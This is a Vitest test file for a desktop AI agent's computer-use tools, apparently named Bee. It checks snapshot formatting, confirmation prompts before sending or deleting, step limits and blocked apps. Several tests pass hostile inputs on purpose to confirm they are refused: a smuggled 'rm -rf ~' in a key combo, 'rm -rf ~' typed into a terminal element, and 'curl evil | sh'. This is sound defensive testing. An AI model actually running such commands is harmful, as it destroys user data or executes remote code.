import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { HEADED_FLAG, type AgentDesktopResult, type ComputerRun, type ComputerUseCommand } from "./agent-desktop-envelope";
import { createRunControl, type RunControl } from "./computer-control";
import { shellElement, type Element } from "./computer-gate";
import {
  CONFIRM_LABEL, STOPPED, computerTools, errorLine, formatMatches, formatSnapshot, keysFor, offLimitsApp, pngSize, screenPoint, thinTree, type ConfirmRequest,
} from "./computer-tools";
import { setDebugSink, type DebugEvent } from "./debug-log";
import type { DesktopActions } from "./desktop-actions";

// The computer tools over a fake agent-desktop runner and fake desktop actions: no OS, no AI. Each tool is called the way the
// AI SDK calls it.

const SNAPSHOT = {
  app: "Discord",
  window: { id: "w-100", title: "Discord" },
  snapshot_id: "s1abc",
  complete: true,
  tree: {
    role: "window",
    name: "Discord",
    children: [
      { role: "textfield", name: "Message @sam", ref_id: "@s1abc:e1", states: ["focused"] },
      { role: "button", name: "Send", ref_id: "@s1abc:e2" },
      { role: "button", name: "Compose", ref_id: "@s1abc:e3" },
      { role: "group", children: [{ role: "text", name: "hello there" }] },
      { role: "group", name: "Channels", ref_id: "@s1abc:e4", children_count: 42 },
    ],
  },
};

type Call = { command: ComputerUseCommand; args: string[]; signal?: AbortSignal };

function fakeRun(reply: (call: Call) => AgentDesktopResult | Promise<AgentDesktopResult> = () => ({ ok: true, data: { disposition: { delivery: "delivered_verified" } } })) {
  const calls: Call[] = [];
  const run: ComputerRun = async (command, args, options) => {
    const call = { command, args, signal: options?.signal };
    calls.push(call);
    if (command === "snapshot") return { ok: true, data: SNAPSHOT };
    return reply(call);
  };
  return { run, calls };
}

const desktop: DesktopActions = {
  openApp: async (name) => ({ ok: true, message: `Opened ${name}` }),
  focusWindow: async ({ app }) => ({ ok: true, message: `Focused ${app}` }),
  openUrl: async (url) => ({ ok: true, message: `Opened ${url}` }),
};

function setup(options: { askFirst?: boolean; confirm?: (request: ConfirmRequest, signal: AbortSignal) => Promise<boolean>; run?: ComputerRun; control?: RunControl } = {}) {
  const fake = fakeRun();
  const run = options.run ?? fake.run;
  const control = options.control ?? createRunControl();
  const asked: ConfirmRequest[] = [];
  const steps: string[] = [];
  const tools = computerTools({
    run,
    desktop,
    control,
    platform: "mac",
    askFirst: () => options.askFirst ?? true,
    confirm: async (request, signal) => {
      asked.push(request);
      return options.confirm ? options.confirm(request, signal) : true;
    },
    onStep: (label) => steps.push(label),
  });
  // The AI SDK's call shape.
  const call = <K extends keyof typeof tools>(name: K, input: Parameters<NonNullable<(typeof tools)[K]["execute"]>>[0]) =>
    (tools[name].execute as (input: unknown, options: unknown) => Promise<unknown>)(input, { toolCallId: `t-${String(name)}`, messages: [] });
  return { tools, call, calls: fake.calls, control, asked, steps };
}

beforeEach(() => {
  vi.spyOn(console, "debug").mockImplementation(() => undefined);
});
afterEach(() => vi.restoreAllMocks());

describe("formatSnapshot", () => {
  it("lists elements with refs, one line each, and remembers what each ref is", () => {
    const seen = new Map<string, Element>();
    const { text, app, focused } = formatSnapshot(SNAPSHOT, (ref, element) => seen.set(ref, element));
    expect(app).toBe("Discord");
    expect(text.split("\n")).toEqual([
      'App "Discord", window "Discord" (w-100)',
      'window "Discord"',
      '  textfield "Message @sam" @s1abc:e1 [focused]',
      '  button "Send" @s1abc:e2',
      '  button "Compose" @s1abc:e3',
      '  text "hello there"',
      '  group "Channels" @s1abc:e4 (42 inside: snapshot it with root)',
    ]);
    // Each ref keeps where it sits: the containers above it, its neighbours' labels and a text field beside it.
    expect(seen.get("@s1abc:e2")).toEqual({
      role: "button",
      name: "Send",
      context: { app: "Discord", ancestors: [{ role: "window", name: "Discord" }], nearby: ["Message @sam", "Compose", "Channels"], field: { role: "textfield", name: "Message @sam" } },
    });
    expect(focused).toMatchObject({ role: "textfield", name: "Message @sam" });
  });

  it("keeps the containers around each ref, and only short neighbour labels, never a text field's draft", () => {
    const seen = new Map<string, Element>();
    const data = {
      app: "Slack",
      window: { title: "general - Acme" },
      tree: {
        role: "window",
        name: "Slack",
        children: [
          {
            role: "group",
            name: "Composer",
            children: [
              { role: "textarea", name: "", value: "please search for the doc", ref_id: "@s2:e1" },
              { role: "toolbar", name: "Formatting", children: [{ role: "button", name: "Bold", ref_id: "@s2:e2" }, { role: "button", name: "", ref_id: "@s2:e3" }] },
            ],
          },
          {
            role: "list",
            name: "Messages in general",
            children: [
              { role: "listitem", name: "Sam: I will send the order confirmation to everyone tomorrow morning", ref_id: "@s2:e4" },
              { role: "listitem", name: "Kim: ok", ref_id: "@s2:e5" },
            ],
          },
        ],
      },
    };
    formatSnapshot(data, (ref, element) => seen.set(ref, element));
    // A text field's name never falls back to its draft (here it would read as a search box).
    expect(seen.get("@s2:e1")).toMatchObject({ role: "textarea", name: "", value: "please search for the doc" });
    expect(seen.get("@s2:e3")?.context).toEqual({
      app: "Slack general - Acme",
      ancestors: [{ role: "toolbar", name: "Formatting" }, { role: "group", name: "Composer" }, { role: "window", name: "Slack" }],
      nearby: ["Bold"],
      field: { role: "textarea", name: "" },
    });
    // A long message is content, not a label: it is not a neighbour.
    expect(seen.get("@s2:e5")?.context?.nearby).toEqual([]);
  });

  it("puts a root snapshot's region under the containers Bee kept for that ref", () => {
    const window = { role: "window", name: "Slack" };
    const within = { ref: "@s1:e7", element: { role: "group", name: "Composer", context: { app: "Slack", ancestors: [window], nearby: [], field: null } } };
    const seen = new Map<string, Element>();
    formatSnapshot({ tree: { role: "group", name: "Composer", ref_id: "@s1:e7", children: [{ role: "button", name: "", ref_id: "@s9:e1" }] } }, (ref, element) => seen.set(ref, element), undefined, within);
    expect(seen.get("@s9:e1")?.context).toMatchObject({ app: "Slack", ancestors: [{ role: "group", name: "Composer" }, window] });
    // A tree whose top is not the ref itself sits under it.
    formatSnapshot({ tree: { role: "group", name: "Inner", children: [{ role: "button", name: "", ref_id: "@s9:e2" }] } }, (ref, element) => seen.set(ref, element), undefined, within);
    expect(seen.get("@s9:e2")?.context?.ancestors).toEqual([{ role: "group", name: "Inner" }, { role: "group", name: "Composer" }, window]);
  });

  it("cuts a huge tree to fit", () => {
    const children = Array.from({ length: 3000 }, (_, index) => ({ role: "button", name: `Item ${index}`, ref_id: `@s1:e${index}` }));
    const { text } = formatSnapshot({ app: "Slack", tree: { role: "window", children } }, () => undefined, 2000);
    expect(text.length).toBeLessThan(2100);
    expect(text).toMatch(/more not shown/);
  });
});

describe("computerTools: what runs", () => {
  it("snapshots an app headless, then clicks a ref from it with fixed argv", async () => {
    const { call, calls } = setup({ askFirst: false });
    expect(await call("snapshot", { app: "Discord" })).toContain('button "Send" @s1abc:e2');
    expect(await call("click", { ref: "@s1abc:e3", effect: "none" })).toBe("Done (delivered_verified).");
    expect(calls.map(({ command, args }) => [command, ...args])).toEqual([
      ["snapshot", "--interactive-only", "--compact", "--app=Discord", "--timeout-ms=12000"],
      ["click", "@s1abc:e3"],
    ]);
  });

  it("types after --, and passes physical keys only when asked", async () => {
    const { call, calls } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    await call("type_text", { ref: "@s1abc:e1", text: "-5 is fine", effect: "none" });
    await call("type_text", { ref: "@s1abc:e1", text: "ok", effect: "none", physical: true });
    await call("set_value", { ref: "@s1abc:e1", value: "draft", effect: "none" });
    expect(calls.slice(1).map(({ command, args }) => [command, ...args])).toEqual([
      ["type", "@s1abc:e1", "--", "-5 is fine"],
      ["type", "@s1abc:e1", HEADED_FLAG, "--", "ok"],
      ["set-value", "@s1abc:e1", "--", "draft"],
    ]);
  });

  it("presses keys in a named app only, and closes apps but never Finder, Explorer or Bee", async () => {
    const { call, calls } = setup({ askFirst: false });
    expect(await call("press_key", { keys: "Cmd + W", app: "Google Chrome", effect: "none" })).toMatch(/^Done/);
    expect(await call("press_key", { keys: "cmd+w; rm -rf ~", app: "Google Chrome", effect: "none" })).toMatch(/^Error/);
    expect(await call("close_app", { name: "Discord" })).toMatch(/^Done/);
    for (const name of ["Finder", "File Explorer", "Bee"]) expect(await call("close_app", { name })).toMatch(/^Error/);
    expect(calls.map(({ command, args }) => [command, ...args])).toEqual([
      ["press", "cmd+w", "--app=Google Chrome"],
      ["close-app", "Discord"],
    ]);
  });

  it("acts only on refs and window ids this task has seen", async () => {
    const { call, calls } = setup({ askFirst: false });
    expect(await call("click", { ref: "@s1abc:e2", effect: "none" })).toMatch(/^Error: use a ref/);
    expect(await call("click", { ref: "@e2", effect: "none" })).toMatch(/^Error: use a ref/);
    expect(await call("snapshot", { app: "Discord", window_id: "w-999" })).toMatch(/window id/);
    expect(await call("snapshot", { root: "@s1abc:e4" })).toMatch(/^Error: use a ref/);
    expect(calls).toEqual([]);
    await call("snapshot", { app: "Discord" });
    expect(await call("snapshot", { root: "@s1abc:e4" })).toContain("Discord");
    expect(await call("snapshot", { app: "Discord", window_id: "w-100" })).toContain("Discord");
  });

  it("never reads, types into or screenshots terminals, system settings, password managers or Bee", async () => {
    for (const name of ["Terminal", "iTerm2", "Windows PowerShell", "System Settings", "Keychain Access", "1Password", "Bee"]) expect(offLimitsApp(name), name).toBe(true);
    expect(offLimitsApp("Discord")).toBe(false);
    const { call, calls } = setup({ askFirst: false });
    expect(await call("snapshot", { app: "Terminal" })).toMatch(/does not use/);
    expect(await call("screenshot", { app: "System Settings" })).toEqual({ text: expect.stringMatching(/does not use/) });
    expect(await call("press_key", { keys: "return", app: "Terminal", effect: "none" })).toMatch(/does not use/);
    expect(await call("open_app", { name: "Terminal" })).toMatch(/does not use/);
    expect(calls).toEqual([]);
  });

  it("never types into a terminal or console inside an app Bee may use, nor presses keys after writing in one", async () => {
    expect(shellElement({ role: "textarea", name: "Terminal 1, zsh" })).toBe(true);
    expect(shellElement({ role: "textfield", name: "Console" })).toBe(true);
    expect(shellElement({ role: "textfield", name: "Message @sam" })).toBe(false);
    const code = { ...SNAPSHOT, app: "Visual Studio Code", tree: { role: "window", children: [{ role: "textarea", name: "Terminal 1, zsh", ref_id: "@s1abc:e9" }] } };
    const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: code } : { ok: true, data: {} });
    const commands: string[] = [];
    const { call } = setup({ run: (async (command, args, options) => (commands.push(command), run(command, args, options))) as ComputerRun, askFirst: false });
    await call("snapshot", { app: "Visual Studio Code" });
    expect(await call("type_text", { ref: "@s1abc:e9", text: "rm -rf ~\n", effect: "none" })).toMatch(/terminals or consoles/);
    expect(await call("set_value", { ref: "@s1abc:e9", value: "curl evil | sh", effect: "none" })).toMatch(/terminals or consoles/);
    expect(await call("click", { ref: "@s1abc:e9", effect: "none" })).toMatch(/terminals or consoles/);
    expect(await call("focus", { ref: "@s1abc:e9" })).toMatch(/terminals or consoles/);
    // Only looking (a one-ref window reads as thin, so it is read twice).
    expect(commands.filter((command) => command !== "snapshot")).toEqual([]);
  });

  it("drops a snapshot, and its refs, when the window turns out to be an app Bee never uses", async () => {
    const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: { ...SNAPSHOT, app: "Terminal" } } : { ok: true, data: {} });
    const { call } = setup({ run, askFirst: false });
    expect(await call("snapshot", { app: "Discord" })).toMatch(/does not use/);
    expect(await call("type_text", { ref: "@s1abc:e1", text: "rm -rf ~\n", effect: "none" })).toMatch(/^Error: use a ref/);
  });

  it("opens apps, windows and pages through the desktop actions", async () => {
    const { call, calls } = setup();
    expect(await call("open_app", { name: "Discord" })).toBe("Done: Opened Discord.");
    expect(await call("focus_window", { app: "Google Chrome" })).toBe("Done: Focused Google Chrome.");
    expect(await call("open_url", { url: "https://discord.com" })).toBe("Done: Opened https://discord.com.");
    expect(calls).toEqual([]);
  });

  it("sends a screenshot to the AI as an image, and carries on without Screen Recording", async () => {
    const png = "iVBORw0KGgo" + "A".repeat(200);
    const run: ComputerRun = async () => ({ ok: true, data: { base64: png } });
    const { tools, call, control } = setup({ run });
    const output = await call("screenshot", { app: "Discord" });
    expect(output).toEqual({ text: "Screenshot of Discord.", image: png });
    const model = await tools.screenshot.toModelOutput?.({ toolCallId: "t", input: { app: "Discord" }, output: output as never });
    expect(model).toEqual({ type: "content", value: [{ type: "text", text: "Screenshot of Discord." }, { type: "file", data: { type: "data", data: png }, mediaType: "image/png" }] });
    const denied = setup({ run: async () => ({ ok: false, code: "PERM_DENIED" }) });
    expect(await denied.call("screenshot", { app: "Discord" })).toEqual({ text: expect.stringMatching(/Screen Recording/) });
    expect(denied.control.reason()).toBeNull();
    expect(control.reason()).toBeNull();
  });

  it("ends the run when Accessibility is refused", async () => {
    const run: ComputerRun = async () => ({ ok: false, code: "PERM_DENIED" });
    const { call, control } = setup({ run });
    expect(await call("list_apps", {})).toMatch(/PERM_DENIED/);
    expect(control.reason()).toBe("permission");
    expect(await call("list_apps", {})).toBe(STOPPED);
  });

  it("shows each step as one short line", async () => {
    const { call, steps } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    await call("click", { ref: "@s1abc:e3", effect: "none" });
    await call("type_text", { ref: "@s1abc:e1", text: "hi", effect: "none" });
    await call("press_key", { keys: "cmd+w", app: "Google Chrome", effect: "none" });
    expect(steps).toEqual(["Looking at Discord…", "Clicking Compose…", "Typing in Message @sam…", "Pressing Cmd+W…"]);
  });

  it("runs parallel calls one at a time, in order", async () => {
    const order: string[] = [];
    const run: ComputerRun = async (command, args) => {
      if (command === "snapshot") return { ok: true, data: SNAPSHOT };
      order.push(`start ${command}`);
      await new Promise((resolve) => setTimeout(resolve, command === "type" ? 20 : 0));
      order.push(`end ${command} ${args.at(-1)}`);
      return { ok: true, data: {} };
    };
    const { call } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Discord" });
    await Promise.all([call("type_text", { ref: "@s1abc:e1", text: "hi", effect: "none" }), call("click", { ref: "@s1abc:e3", effect: "none" })]);
    expect(order).toEqual(["start type", "end type hi", "start click", "end click @s1abc:e3"]);
  });
});

describe("computerTools: loop controls", () => {
  it("does nothing past the step limit", async () => {
    const { call, calls, control } = setup({ control: createRunControl({ maxSteps: 2 }) });
    await call("snapshot", { app: "Discord" });
    await call("click", { ref: "@s1abc:e3", effect: "none" });
    expect(await call("click", { ref: "@s1abc:e3", effect: "none" })).toBe(STOPPED);
    expect(calls).toHaveLength(2);
    expect(control.reason()).toBe("steps");
  });

  it("aborts the command in flight on stop", async () => {
    let started: () => void = () => undefined;
    const running = new Promise<void>((resolve) => (started = resolve));
    const run: ComputerRun = (_command, _args, options) =>
      new Promise((resolve) => {
        started();
        options?.signal?.addEventListener("abort", () => resolve({ ok: false, code: "ABORTED" }));
      });
    const { call, control } = setup({ run });
    const pending = call("list_apps", {});
    await running;
    control.stop("user");
    expect(await pending).toMatch(/ABORTED/);
    expect(await call("list_apps", {})).toBe(STOPPED);
  });
});

describe("computerTools: ask before sending or deleting", () => {
  it("waits for Confirm before a send, then sends", async () => {
    let answer: (confirmed: boolean) => void = () => undefined;
    const { call, calls, asked, steps } = setup({ confirm: () => new Promise((resolve) => (answer = resolve)) });
    await call("snapshot", { app: "Discord" });
    const click = call("click", { ref: "@s1abc:e2", effect: "none" });
    await vi.waitFor(() => expect(asked).toHaveLength(1));
    expect(asked[0]).toEqual({ kind: "send", question: "Send this?", detail: "Click “Send” in Discord" });
    expect(steps.at(-1)).toBe(CONFIRM_LABEL);
    expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
    answer(true);
    expect(await click).toMatch(/^Done/);
    expect(calls.map((item) => item.command)).toEqual(["snapshot", "click"]);
    expect(steps.at(-1)).toBe("Clicking Send…");
  });

  it("stops the task, and never sends, on Cancel", async () => {
    const { call, calls, control } = setup({ confirm: async () => false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s1abc:e2", effect: "none" })).toBe(STOPPED);
    expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
    expect([control.reason(), control.declined()]).toEqual(["declined", "send"]);
  });

  it("asks before Return in a message box and before an effect the AI declares, but not before drafting", async () => {
    const { call, asked } = setup();
    await call("snapshot", { app: "Discord" });
    await call("type_text", { ref: "@s1abc:e1", text: "Running late", effect: "none" });
    await call("click", { ref: "@s1abc:e3", effect: "none" });
    expect(asked).toEqual([]);
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Return in “Message @sam”"]]);
    await call("click", { ref: "@s1abc:e3", effect: "delete" });
    expect(asked.map((request) => request.kind)).toEqual(["send", "delete"]);
  });

  it("runs on its own with the setting off", async () => {
    const { call, calls, asked } = setup({ askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s1abc:e2", effect: "send" })).toMatch(/^Done/);
    expect(asked).toEqual([]);
    expect(calls.map((item) => item.command)).toEqual(["snapshot", "click"]);
  });

  it("reads Stop while waiting as Cancel, and does not count the wait against the clock", async () => {
    vi.useFakeTimers();
    try {
      const control = createRunControl({ maxMs: 5000 });
      const { call, calls } = setup({ control, confirm: () => new Promise(() => undefined) });
      await call("snapshot", { app: "Discord" });
      const click = call("click", { ref: "@s1abc:e2", effect: "none" });
      await vi.advanceTimersByTimeAsync(30_000);
      expect(control.reason()).toBeNull();
      control.stop("user");
      expect(await click).toBe(STOPPED);
      expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
      expect(control.reason()).toBe("user");
    } finally {
      vi.useRealTimers();
    }
  });
});

describe("computerTools: the confirm gate reads the tree, not the AI", () => {
  // Discord with an unlabelled arrow send button beside the message box, and a message's hover toolbar with a trash icon.
  const DISCORD = {
    app: "Discord",
    window: { id: "w-200", title: "@sam - Discord" },
    tree: {
      role: "window",
      name: "Discord",
      children: [
        { role: "tree", name: "Direct Messages", children: [{ role: "treeitem", name: "sam", ref_id: "@s3:e1" }] },
        { role: "textfield", name: "Search", ref_id: "@s3:e2" },
        {
          role: "list",
          name: "Messages in @sam",
          children: [
            {
              role: "listitem",
              name: "sam: hello there",
              children: [{ role: "toolbar", name: "Message actions", children: [{ role: "button", name: "Add Reaction", ref_id: "@s3:e3" }, { role: "button", name: "🗑", ref_id: "@s3:e4" }] }],
            },
          ],
        },
        {
          role: "group",
          name: "Message @sam",
          ref_id: "@s3:e5",
          children: [
            { role: "button", name: "Upload a file", ref_id: "@s3:e6" },
            { role: "textfield", name: "Message @sam", ref_id: "@s3:e7" },
            { role: "button", name: "Emoji", ref_id: "@s3:e8" },
            { role: "button", name: "", ref_id: "@s3:e9" },
          ],
        },
      ],
    },
  };
  const discordRun = (extra: (call: Call) => AgentDesktopResult | null = () => null) => {
    const commands: Call[] = [];
    const run: ComputerRun = async (command, args) => {
      commands.push({ command, args });
      return extra({ command, args }) ?? (command === "snapshot" ? { ok: true, data: DISCORD } : { ok: true, data: {} });
    };
    return { run, commands };
  };

  it("asks before clicking an unlabelled send arrow, though the AI said none", async () => {
    const { run, commands } = discordRun();
    const { call, asked } = setup({ run, confirm: async () => false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s3:e9", effect: "none" })).toBe(STOPPED);
    expect(asked).toEqual([{ kind: "send", question: "Send this?", detail: "Click the selected item in Discord" }]);
    expect(commands.map((item) => item.command)).toEqual(["snapshot"]);
  });

  it("asks before a trash icon, but not before navigating, drafting or opening the emoji picker", async () => {
    const { run } = discordRun();
    const { call, asked } = setup({ run });
    await call("snapshot", { app: "Discord" });
    await call("click", { ref: "@s3:e1", effect: "none" });
    await call("click", { ref: "@s3:e7", effect: "none" });
    await call("set_value", { ref: "@s3:e7", value: "Running late", effect: "none" });
    await call("click", { ref: "@s3:e8", effect: "none" });
    expect(asked).toEqual([]);
    await call("click", { ref: "@s3:e4", effect: "none" });
    await call("click", { ref: "@s3:e6", effect: "none" });
    expect(asked.map((request) => request.kind)).toEqual(["delete", "send"]);
  });

  it("asks before Return once focus may have left a search box", async () => {
    const { run } = discordRun();
    const { call, asked } = setup({ run });
    await call("snapshot", { app: "Discord" });
    await call("type_text", { ref: "@s3:e2", text: "sam", effect: "none" });
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked).toEqual([]);
    // The search jumped somewhere: focus is unknown, so a second Return asks.
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["submit", "Press Return in Discord"]]);
    // Clicking into the message box puts focus there; Return sends.
    await call("click", { ref: "@s3:e7", effect: "none" });
    await call("press_key", { keys: "ctrl+enter", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail]).at(-1)).toEqual(["send", "Press Ctrl+Enter in “Message @sam”"]);
  });

  it("asks before Return when a snapshot shows the message box focused, with nothing typed this run", async () => {
    const focused = { ...SNAPSHOT, tree: { role: "window", children: [{ role: "textarea", name: "Message #job-search", ref_id: "@s4:e1", states: ["focused"] }] } };
    const { call, asked } = setup({ run: async (command) => (command === "snapshot" ? { ok: true, data: focused } : { ok: true, data: {} }) });
    await call("snapshot", { app: "Discord" });
    await call("press_key", { keys: "return", app: "Discord", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Return in “Message #job-search”"]]);
  });

  it("keeps the containers above a root snapshot's region, and asks before an unlabelled match from find", async () => {
    // The region alone says nothing (no app, no names): only what Bee kept about @s3:e5 shows it is Discord's message box.
    const region = { tree: { role: "group", name: "", ref_id: "@s3:e5", children: [{ role: "button", name: "", ref_id: "@s5:e1" }] } };
    const { run } = discordRun(({ command, args }) => {
      if (command === "snapshot" && args.includes("--root=@s3:e5")) return { ok: true, data: region };
      if (command === "find") return { ok: true, data: { matches: [{ role: "button", name: "", ref_id: "@s6:e1" }, { role: "button", name: "Gift", ref_id: "@s6:e2" }] } };
      return null;
    });
    const { call, asked } = setup({ run });
    await call("snapshot", { app: "Discord" });
    await call("snapshot", { root: "@s3:e5" });
    await call("click", { ref: "@s5:e1", effect: "none" });
    expect(asked.map((request) => request.kind)).toEqual(["send"]);
    await call("find", { app: "Discord", role: "button" });
    await call("click", { ref: "@s6:e2", effect: "none" });
    expect(asked).toHaveLength(1);
    await call("click", { ref: "@s6:e1", effect: "none" });
    expect(asked.map((request) => request.kind)).toEqual(["send", "send"]);
  });

  it("still runs on its own with the setting off", async () => {
    const { run, commands } = discordRun();
    const { call, asked } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s3:e9", effect: "none" })).toMatch(/^Done/);
    expect(await call("click", { ref: "@s3:e4", effect: "none" })).toMatch(/^Done/);
    expect(asked).toEqual([]);
    expect(commands.map((item) => item.command)).toEqual(["snapshot", "click", "click"]);
  });
});

describe("formatSnapshot and formatMatches: odd nodes", () => {
  it("survives hostile, partial and very deep nodes, and says what it left out", () => {
    const hostile = Object.defineProperty({ role: "button", ref_id: "@s1:e9" }, "name", {
      enumerable: true,
      get() {
        throw new Error("boom");
      },
    });
    const trap = new Proxy(
      {},
      {
        get() {
          throw new Error("trap");
        },
      },
    );
    let deep: Record<string, unknown> = { role: "button", name: "Deep", ref_id: "@s1:e99" };
    for (let index = 0; index < 5000; index += 1) deep = { role: "group", name: `g${index}`, children: [deep] };
    const data = {
      app: "Microsoft Teams",
      complete: false,
      tree: {
        role: "window",
        children: [
          { role: "button", name: "Send", ref_id: "@s1:e1" },
          hostile,
          trap,
          { role: 42, name: { x: 1 }, value: ["v"], states: "focused", children: "nope", children_count: "12", ref_id: 7 },
          { role: "textfield", name: "Type a message", ref_id: "@s1:e2", states: [null, 3, "focused"] },
          null,
          5,
          "text",
          deep,
        ],
      },
    };
    const seen = new Map<string, Element>();
    const { text, focused } = formatSnapshot(data, (ref, element) => seen.set(ref, element));
    expect(text).toContain('button "Send" @s1:e1');
    expect(text).toContain('textfield "Type a message" @s1:e2 [focused]');
    expect(text).toContain(", partial: raise detail with root");
    expect(text).toMatch(/2 elements could not be read and are left out/);
    expect(text).toMatch(/deeper elements not shown/);
    expect(focused).toMatchObject({ role: "textfield", name: "Type a message" });
    expect([...seen.keys()]).toEqual(expect.arrayContaining(["@s1:e1", "@s1:e2"]));
    expect(seen.has("@s1:e9")).toBe(false);
    // Not a tree at all.
    expect(formatSnapshot("nope", () => undefined).text).toBe("Empty snapshot.");
    expect(formatSnapshot({ tree: trap }, () => undefined).text).toMatch(/1 element could not be read/);
  });

  it("keeps the matches it can read", () => {
    const hostile = Object.defineProperty({ role: "button" }, "name", {
      enumerable: true,
      get() {
        throw new Error("boom");
      },
    });
    expect(formatMatches({ matches: [hostile, { role: "button", name: "Send", ref_id: "@s2:e1" }] }, () => undefined)).toBe('button "Send" @s2:e1');
    expect(formatMatches({ matches: [hostile] }, () => undefined)).toBe("No matches Bee could read.");
  });
});

describe("errorLine: what the AI is told", () => {
  it("names the code, says what to do, and passes on agent-desktop's redacted message", () => {
    const line = errorLine({ ok: false, code: "INTERNAL", message: "Accessibility deadline exhausted before IPC", retry: "safe" }, true);
    expect(line).toMatch(/^Error INTERNAL: /);
    expect(line).toMatch(/skeleton snapshot, then root/);
    expect(line).toMatch(/screenshot and use click_at/);
    expect(line).toMatch(/Detail: Accessibility deadline exhausted before IPC$/);
    expect(line).not.toMatch(/that did not work/);
  });

  it("tells a slow read from an action that may have happened", () => {
    expect(errorLine({ ok: false, code: "TIMEOUT" }, true)).toMatch(/did not finish in time/);
    expect(errorLine({ ok: false, code: "TIMEOUT" })).toMatch(/may still have happened/);
    expect(errorLine({ ok: false, code: "INTERNAL", retry: "unsafe" })).toMatch(/It may still have happened: look before trying again\./);
    expect(errorLine({ ok: false, code: "INTERNAL", retry: "safe" })).not.toMatch(/may still have happened/);
    expect(errorLine("STALE_REF")).toBe("Error STALE_REF: the screen changed. Take a new snapshot and use its refs.");
    expect(errorLine({ ok: false, code: "SOMETHING_NEW", message: "odd" })).toBe("Error SOMETHING_NEW: that did not work. Look again before trying something else. Detail: odd");
    for (const code of ["INTERNAL", "BAD_OUTPUT", "SPAWN_FAILED", "REFUSED", "TIMEOUT_LOCAL", "APP_UNRESPONSIVE"]) expect(errorLine(code, true), code).not.toMatch(/that did not work/);
  });
});

describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such as Teams)", () => {
  type Timed = { command: ComputerUseCommand; args: string[]; timeoutMs?: number };
  const INTERNAL: AgentDesktopResult = { ok: false, code: "INTERNAL", message: "Accessibility deadline exhausted before IPC", retry: "safe" };
  const tree = (refs: number, extra: Record<string, unknown> = {}) => ({
    app: "Microsoft Teams",
    window: { id: "w-7", title: "Chat | Microsoft Teams" },
    ...extra,
    tree: { role: "window", children: Array.from({ length: refs }, (_, index) => ({ role: "button", name: `Item ${index}`, ref_id: `@s7:e${index}` })) },
  });
  const timedRun = (reply: (call: Timed, index: number) => AgentDesktopResult) => {
    const calls: Timed[] = [];
    const run: ComputerRun = async (command, args, options) => {
      const call = { command, args, timeoutMs: options?.timeoutMs };
      calls.push(call);
      return reply(call, calls.length - 1);
    };
    return { run, calls };
  };

  it("reads again once, in a new process with more time and depth, when a read fails where a retry is safe", async () => {
    const { run, calls } = timedRun(() => INTERNAL);
    const { call, steps } = setup({ run, askFirst: false });
    const line = await call("snapshot", { app: "Microsoft Teams" });
    expect(line).toMatch(/^Error INTERNAL: .*Detail: Accessibility deadline exhausted before IPC$/);
    expect(calls.map(({ args, timeoutMs }) => [args.slice(2).join(" "), timeoutMs])).toEqual([
      ["--app=Microsoft Teams --timeout-ms=12000", 18_000],
      ["--app=Microsoft Teams --max-depth=25 --timeout-ms=25000", 31_000],
    ]);
    expect(steps).toEqual(["Looking at Microsoft Teams…", "Waiting for the app…"]);
  });

  it("returns the second read when it works", async () => {
    const { run, calls } = timedRun((_call, index) => (index === 0 ? INTERNAL : { ok: true, data: tree(6) }));
    const { call } = setup({ run, askFirst: false });
    expect(await call("snapshot", { app: "Microsoft Teams", skeleton: true })).toContain('button "Item 5" @s7:e5');
    // A skeleton is shallow by design: the second read is longer, not deeper.
    expect(calls.map(({ args }) => args.at(-2))).toEqual(["--skeleton", "--skeleton"]);
  });

  it("does not read again when agent-desktop does not call a retry safe, or for an error a retry cannot fix", async () => {
    for (const failure of [{ ok: false, code: "INTERNAL", message: "x" }, { ok: false, code: "INTERNAL", retry: "unsafe" }, { ok: false, code: "APP_NOT_FOUND", retry: "safe" }] as AgentDesktopResult[]) {
      const { run, calls } = timedRun(() => failure);
      const { call } = setup({ run, askFirst: false });
      await call("snapshot", { app: "Microsoft Teams" });
      expect(calls, JSON.stringify(failure)).toHaveLength(1);
    }
    // A renderer that is still waking up reads again, whatever the code.
    const { run, calls } = timedRun(() => ({ ok: false, code: "ACTION_FAILED", retry: "safe", kind: "renderer_accessibility_activation_required" }));
    await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
    expect(calls).toHaveLength(2);
  });

  it("reads a thin window again and keeps the better read; a thin read beats a failed one", async () => {
    const better = timedRun((_call, index) => ({ ok: true, data: index === 0 ? tree(2) : tree(30) }));
    const shown = await setup({ run: better.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
    expect(shown).toContain('button "Item 29" @s7:e29');
    expect(shown).not.toMatch(/Few elements/);
    const failed = timedRun((_call, index) => (index === 0 ? { ok: true, data: tree(2) } : INTERNAL));
    const thin = await setup({ run: failed.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
    expect(thin).toContain('button "Item 1" @s7:e1');
    expect(thin).toMatch(/Few elements came back: the app may still be loading/);
  });

  it("returns a partial tree rather than an error, and reads a partial one again only when it is small", async () => {
    expect(thinTree(tree(30, { complete: false }))).toBe(false);
    expect(thinTree(tree(12, { complete: false }))).toBe(true);
    expect(thinTree(tree(12, { complete: true }))).toBe(false);
    expect(thinTree(tree(2))).toBe(true);
    expect(thinTree({ ref_count: 40, tree: {} })).toBe(false);
